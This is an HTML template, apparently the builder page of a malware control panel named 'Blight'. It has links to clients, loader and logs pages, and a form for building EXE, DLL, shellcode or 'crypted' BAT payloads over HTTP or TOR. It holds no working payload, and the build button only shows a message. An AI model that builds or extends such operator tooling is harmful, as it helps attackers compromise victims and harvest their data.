<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Blight - Builder</title>
    <link rel="stylesheet" href="{{ url_for('static',filename='css/stylesheet.css') }}" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
    />
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="{{ url_for('static',filename='js/toast.js') }}"></script>
  </head>
  <body>
    <nav class="navbar">
      <ul>
        <img class="logo" src="{{ url_for('static',filename='misc/logo.png') }}" />
        <li>
          <a href="clients"><i class="fas fa-user"></i></a>
        </li>
        <li>
          <a href="loader"><i class="fas fa-inbox"></i></a>
        </li>
        <li>
          <a href="logs"><i class="fas fa-envelope"></i></a>
        </li>
        <li>
          <a href="builder"><i class="fas fa-screwdriver-wrench"></i></a>
        </li>
        <li>
          <a href="#"><i class="fas fa-cog"></i></a>
        </li>
        
      </ul>
    </nav>


      <div class="menusex">
        <select>
          <option>EXE</option>
          <option>DLL</option>
          <option>Shellcode</option>
          <option>Crypted BAT</option>
        </select>
        <select>
          <option>HTTP Connection</option>
          <option>TOR HTTP Connection</option>
        </select>
        <input type="number" style="width: 50px" value="60">
        
        <button onclick='launch_toast("Build started, may take a while", "fa-solid fa-wand-magic-sparkles")'>
          <i class="fa-solid fa-hammer"></i>
        </button>
      </div>
    <div id="toast-container"></div>     
  </body>
</html>
